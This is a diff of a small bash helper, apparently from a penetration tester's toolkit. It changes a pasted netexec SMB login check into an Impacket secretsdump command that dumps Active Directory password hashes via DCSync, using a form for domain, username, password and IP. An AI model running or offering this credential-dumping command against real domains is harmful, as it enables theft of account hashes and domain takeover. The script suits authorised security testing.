@@ -1,17 +1,18 @@
 #!/bin/bash
 
 : '
-enumerate over ad users and password file
+Impacket: use secretsdump to dump hashes (DCSync)
 '
 
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
 source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
 
 # Generate gui form
-generate_form "IP" "Username" "Password"
+generate_form "Domain" "Username" "Password" "IP"
 
-IP=${form_data["IP"]}
+DOMAIN=${form_data["Domain"]}
 USERNAME=${form_data["Username"]}
 PASSWORD=${form_data["Password"]}
+IP=${form_data["IP"]}
 
-paste_command "netexec smb ${IP} -u ${USERNAME} -p ${PASSWORD}"
+paste_command "secretsdump.py ${DOMAIN}/${USERNAME}:${PASSWORD}@${IP}"
